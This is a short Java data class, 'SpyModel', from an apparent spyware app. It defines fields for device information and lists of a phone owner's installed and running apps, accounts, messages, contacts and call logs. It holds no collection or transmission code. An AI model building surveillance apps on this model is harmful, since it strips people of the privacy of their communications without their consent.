package com.example.spyapp;

import lombok.Data;

import java.util.List;

@Data
public class SpyModel {
    private String version;
    private int sdk;
    private int battery;
    private long memory;

    private List<String> running;
    private List<String> installed;
    private List<String> accounts;
    private List<String> messages;
    private List<String> contacts;
    private List<String> calls;
}
